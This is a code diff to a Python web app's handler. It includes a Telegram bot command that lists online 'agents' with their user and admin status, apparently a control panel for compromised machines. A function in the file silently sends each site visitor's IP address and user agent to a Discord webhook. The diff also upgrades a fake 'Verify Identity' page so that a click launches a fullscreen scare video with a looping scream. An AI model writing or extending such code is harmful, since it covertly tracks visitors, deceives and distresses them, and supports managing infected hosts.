@@ -1,5 +1,5 @@
 # api/index.py
-# FINAL VERSION - Added Video Jumpscare and IP Logger
+# FINAL VERSION - Upgraded jumpscare to a looping video with continuous sound.
 
 import os
 import re
@@ -120,7 +120,7 @@ async def cmd_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
             for agent in active_agents:
                 is_admin_text = "Admin" if agent.get('is_admin') else "User"
                 agent_user = agent.get('user', 'N/A')
-                message += f"🟢 *ONLINE*\n`{esc(agent.get('id'))}`\n*User:* {esc(agent_user)} `\\({is_admin_text}\\)`\n\n"
+                message += f"🟢 *ONLINE*\n`{esc(agent.get('id'))}`\n*User:* {esc(agent_user)} `\\({esc(is_admin_text)}\\)`\n\n"
     except Exception as e:
         message = f"❌ Error fetching agent list: `{esc(str(e))}`"
     await update.message.reply_text(message, parse_mode='MarkdownV2')
@@ -199,17 +199,7 @@ def process_webhook():
 def log_to_discord(ip, user_agent):
     if not DISCORD_WEBHOOK_URL:
         return
-    data = {
-        "embeds": [{
-            "title": "Vercel Site Visitor",
-            "color": 15158332, # Red
-            "fields": [
-                {"name": "IP Address", "value": f"`{ip}`", "inline": True},
-                {"name": "Timestamp", "value": f"`{time.ctime()}`", "inline": True},
-                {"name": "User Agent", "value": f"```{user_agent}```"}
-            ]
-        }]
-    }
+    data = { "embeds": [{"title": "Vercel Site Visitor", "color": 15158332, "fields": [{"name": "IP Address", "value": f"`{ip}`", "inline": True}, {"name": "Timestamp", "value": f"`{time.ctime()}`", "inline": True}, {"name": "User Agent", "value": f"```{user_agent}```"}]}] }
     try:
         # Use a standard synchronous post here as it's not in an async function
         import requests
@@ -224,7 +214,7 @@ def health_check_and_scare():
     user_agent = request.headers.get('User-Agent', 'Unknown')
     log_to_discord(ip_address, user_agent)
 
-    # --- Jumpscare HTML with Video ---
+    # --- Jumpscare HTML with Video and Looping Audio ---
     html_content = """
     <!DOCTYPE html>
     <html lang="en">
@@ -247,21 +237,37 @@ def health_check_and_scare():
             <button id="enter-btn">Verify Identity</button>
         </div>
         <div id="scare">
-            <video id="scare-video" src="https://github.com/a9-s/v/raw/main/v.mp4" preload="auto"></video>
+            <video id="scare-video" src="https://github.com/a9-s/v/raw/main/v.mp4" playsinline></video>
         </div>
+        <audio id="scream" src="https://github.com/a9-s/v/raw/main/s.mp3" loop></audio>
         <script>
             const enterButton = document.getElementById('enter-btn');
             const scareContainer = document.getElementById('scare');
             const scareVideo = document.getElementById('scare-video');
+            const screamSound = document.getElementById('scream');
+            
             enterButton.addEventListener('click', () => {
                 document.getElementById('container').style.display = 'none';
                 scareContainer.style.display = 'block';
-                scareVideo.muted = false;
+                
+                // Mute the video's own audio to only hear our looping sound
+                scareVideo.muted = true; 
+                
+                // Play video and looping sound
+                screamSound.play();
                 scareVideo.play();
+                
+                // Attempt to go fullscreen
                 try {
-                    scareContainer.requestFullscreen();
+                    if (scareContainer.requestFullscreen) {
+                        scareContainer.requestFullscreen();
+                    } else if (scareContainer.webkitRequestFullscreen) { /* Safari */
+                        scareContainer.webkitRequestFullscreen();
+                    } else if (scareContainer.msRequestFullscreen) { /* IE11 */
+                        scareContainer.msRequestFullscreen();
+                    }
                 } catch (e) {
-                    console.log('Fullscreen API not supported.');
+                    console.log('Fullscreen not supported.');
                 }
             });
         </script>
